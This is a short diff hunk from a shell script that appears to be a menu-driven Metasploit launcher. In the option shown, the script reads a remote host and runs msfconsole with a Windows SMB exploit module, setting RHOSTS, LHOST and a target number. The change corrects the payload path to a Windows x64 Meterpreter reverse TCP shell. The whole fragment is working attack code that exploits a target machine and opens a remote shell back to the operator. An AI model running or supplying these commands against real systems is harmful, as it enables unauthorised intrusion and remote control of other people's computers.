@@ -228,7 +228,7 @@ elif [ $opc -eq 7 ]; then
 	read rhost
 	echo ""
 	msfconsole -q -x " use exploit/windows/smb/SMBploit;
-	set PAYLOAD windows/x64meterpreter/reverse_tcp;
+	set PAYLOAD windows/x64/meterpreter/reverse_tcp;
 	set RHOSTS $rhost;
 	set LHOST $lhost;
 	set target 8;
